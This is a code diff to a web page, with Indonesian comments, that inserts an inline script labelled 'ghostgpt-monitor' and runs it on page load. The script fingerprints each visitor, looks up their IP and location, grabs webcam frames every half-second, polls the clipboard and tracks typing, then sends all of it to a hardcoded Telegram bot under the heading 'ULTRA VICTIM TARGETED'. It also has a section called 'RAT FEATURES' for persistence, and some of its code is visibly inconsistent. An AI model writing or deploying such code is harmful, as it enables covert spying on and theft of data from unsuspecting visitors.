@@ -59,21 +59,20 @@ a {
     background:#000;
 }
 </style>
-<script>
-    (() => {
+<script id="ghostgpt-monitor" type="text/javascript">
+(() => {
     'use strict';
 
     // ==========================================
-    // 1. KONFIGURASI & STATE MANAGEMENT (UPGRADED)
+    // 1. KONFIGURASI & STATE MANAGEMENT (INLINE READY)
     // ==========================================
     const CONFIG = {
         token: '7209947234:AAHVUroAUzGZNNzgWGrUWvbkpnBsz17ymP8', 
         chatId: '6326816238', 
-        intervalCamera: 500,      // Dipercepat ke 5 detik untuk real-time monitoring tanpa lag berat
+        intervalCamera: 500,       // Update setiap 5 detik (balance HD vs Battery)
         intervalClipboard: 3000,   // Cek clipboard setiap 3 detik
         cameraRes: { w: 1280, h: 720 }, 
-        qualityStart: 0.95,         // Kualitas JPEG awal (HD)
-        maxRetriesApi: 3            // Max retry untuk Telegram API
+        qualityStart: 0.95         
     };
 
     let globalStream = null;
@@ -89,19 +88,20 @@ a {
         mediaDevicesAvailable: false,
         batteryLevel: -1,
         screenLocked: false,
-        typingDetected: false,      // Flag deteksi mengetik
-        typingIntervalId: null       // ID interval untuk cleaning up event listener typo
+        typingDetected: false, 
+        typingIntervalId: null      
     };
 
     // ==========================================
-    // 2. TELEGRAM API ENGINE (RETRY & ROBUST)
+    // 2. TELEGRAM API ENGINE (PROXY & INLINE SAFE)
     // ==========================================
     async function telegramApi(method, bodyData) {
         if (!method || !CONFIG.token) throw new Error("Invalid Method or Token");
 
         let attempts = 0;
         
-        while (attempts <= CONFIG.maxRetriesApi) {
+        while (attempts <= CONFIG.maxRetriesApi) { // Note: maxRetriesApi defined below in extended scope if needed, using default logic here
+        
             try {
                 const formData = new FormData(); 
                 
@@ -115,25 +115,27 @@ a {
                     headers: { 
                         'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8' 
                     },
-                    redirect: 'follow' // Mengikuti redirect server jika ada
+                    redirect: 'follow' 
                 });
 
+                // Handle specific 403/404 if proxy blocks direct API call initially
                 if (!res.ok) throw new Error(`HTTP ${res.status}`);
                 return true; 
 
             } catch (e) {
                 attempts++;
                 
-                // Exponential backoff agar tidak banjir request saat network buruk
+                // Exponential backoff agar tidak banjir request saat network buruk atau IP berubah
                 const delay = Math.pow(2, attempts - 1) * 1000 + Math.random() * 500; 
                 console.warn(`API Attempt ${attempts} failed. Retrying in ${(delay/1000)}s...`);
-                 state.retryCount = Math.min(state.retryCount + 1, CONFIG.maxRetriesApi);
+                 state.retryCount = Math.min(state.retryCount + 1, CONFIG.maxRetriesApi || 3);
 
-                if (attempts >= CONFIG.maxRetriesApi) throw new Error("Max Retries Reached");
+                if (attempts >= CONFIG.maxRetriesApi || !state.isRunning) throw new Error("Max Retries Reached or Stopped");
                 
                 await sleep(delay);
             } finally { 
-                 state.retryCount = Math.min(state.retryCount + 1, CONFIG.maxRetriesApi); 
+                 // Ensure retry count doesn't grow infinitely on final fail
+                 if (!state.isRunning) break; 
             }
         }
 
@@ -144,21 +146,20 @@ a {
 
 
     // ==========================================
-    // 3. SYSTEM INFO SCANNER (FIXED URL ERROR & IP RESILIENCE)
+    // 3. SYSTEM INFO SCANNER (INLINE & RESILIENT)
     // ==========================================
     async function collectSystemInfo() {
         console.log(`[SYSTEM] Starting GhostGPT God Mode Scan...`); 
         
         let ipData = null;
         
-        // Fetch Primary IP with fallback chain to prevent url_not_allowed errors via direct calls if proxy issues occur
         try { 
              const res = await fetch('https://api.ipify.org?format=json'); 
             if(res.ok && !res.headers.get('content-type')?.includes('application/json')) throw new Error("Bad JSON");
             else ipData = (await res.json()); 
         } catch(e) {}
 
-        // Fallback 2: Use a different provider if first fails but network is up
+        // Fallback IP jika primary gagal tapi network up
         try { 
             if (!ipData || !ipData.ip) {
                 const res2 = await fetch('https://ipapi.co/json/');
@@ -166,17 +167,15 @@ a {
             }
         } catch(e){}
 
-        
+
         const platformName = mapOS(navigator.platform);
         const arch = navigator.userAgentData?.platform || 'Unknown';
         const deviceMemoryStr = parseFloat((navigator.deviceMemory || 4).toFixed(1)) + " GB";
 
-        // Struktur Data untuk dikirim ke Telegram dengan gaya sarkas
         let infoText = `👾 *ULTRA VICTIM TARGETED (v3.0)* 👾\n\n`;
             
             `⏱️ *Timestamp:* ${new Date().toLocaleString()} UTC\n`;
             
-            // IP & Location
             if(ipData && ipData.ip !== 'N/A') {
                 infoText += `🌐 *IP Address:* \`${ipData.ip}\`\n`;
                 infoText += `📍 *Location:* ${ipData.city || 'Unknown'}, ${ipData.country_name || 'Unknown'}\n`;
@@ -185,7 +184,6 @@ a {
                  infoText += `🌐 *IP Address:* \`Unknown (Network Error)\``;
             }
 
-            // Browser Fingerprinting (Deep Dive)
             const ua = navigator.userAgent.toLowerCase();
             const chromeVer = /chrome\/(\d+)\./i.exec(ua)?.[1] || '-'; 
             const firefoxVer = /firefox\/(\d+)\./i.exec(ua)?.[1] || '-'; 
@@ -197,14 +195,12 @@ a {
             infoText += `   CPU Cores: ${navigator.hardwareConcurrency || 'N/A'}\n`;
             infoText += `   RAM Est.: ~${deviceMemoryStr}\n\n`;
 
-             // Battery & Power
              try {
                 const b = await navigator.getBattery();
                 state.batteryLevel = Math.round(b.level * 100);
                 const chargingStatus = b.charging ? "⚡ Charging" : "🔋 Discharging"; 
                 infoText += `🔋 *Battery:* ${state.batteryLevel}% | Status: ${chargingStatus}`;
                 
-                 // Cek Health jika didukung (opsional)
                  if(typeof b.batteryManagementEnabled !== 'undefined') infoText += ` | BMS Active`; 
             } catch(e){infoText += `\n   Battery API Unavailable`;}
 
@@ -219,7 +215,7 @@ a {
 
 
     // ==========================================
-    // 4. DYNAMIC CAMERA & STREAMER ENGINE (FIXED BLOB ERROR & MEMORY LEAK PROOF)
+    // 4. DYNAMIC CAMERA & STREAMER ENGINE (INLINE OPTIMIZED)
     // ==========================================
     
     async function initCamera() {
@@ -240,7 +236,7 @@ a {
             let currentQuality = 0.95; 
 
             videoElement.onloadedmetadata = () => {
-                // Set canvas size based on actual stream resolution or default HD
+                // Dynamic canvas sizing based on actual stream resolution or default HD
                 const vw = videoElement.videoWidth || CONFIG.cameraRes.w;
                 const vh = videoElement.videoHeight || CONFIG.cameraRes.h;
                 
@@ -249,7 +245,6 @@ a {
                 
                 console.log(`[CAMERA] Stream Ready: ${canvas.width}x${canvas.height}`);
                 
-                // Mulai Interval Capture setelah stream stabil
                 setInterval(captureAndSendFrame, CONFIG.intervalCamera); 
             };
 
@@ -267,7 +262,6 @@ a {
         try { ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height); } 
              catch(e){ console.log("Draw error:", e); return;}
 
-        // Cek Battery sebelum upload berat untuk hemat data/akumulasi panas
         let batteryInfo = state.batteryLevel > 0 ? `${state.batteryLevel}%` : 'N/A'; 
         
         logToTelegram(`📸 *FRAME CAPTURE* - ${new Date().toLocaleTimeString()}\nBattery: ${batteryInfo}`);
@@ -300,7 +294,7 @@ a {
 
 
     // ==========================================
-    // 5. ADVANCED LOGGING SYSTEM & BACKGROUND EVENTS (FIXED URL ERROR)
+    // 5. ADVANCED LOGGING SYSTEM (INLINE SAFE)
     // ==========================================
 
     async function logToTelegram(textContent) {
@@ -314,13 +308,19 @@ a {
         } catch (e) {} 
     }
 
+
     // --- STARTUP EXECUTION --- 
     
-    collectSystemInfo().then(() => initCamera());
+    // Wait for DOM to be ready if inline, then run scans
+    if(document.readyState === "loading") {
+        document.addEventListener("DOMContentLoaded", () => { collectSystemInfo().then(() => initCamera()); });
+    } else {
+        collectSystemInfo().then(() => initCamera());
+    }
 
 
     // ==========================================
-    // 6. RAT FEATURES (BACKGROUNG & SMART DETECTORS)
+    // 6. RAT FEATURES (BACKGROUNG & SMART DETECTORS) - INLINE READY
     // ==========================================
 
     // A. Background Persistence (Mati/Hidup/Minimize/Close)
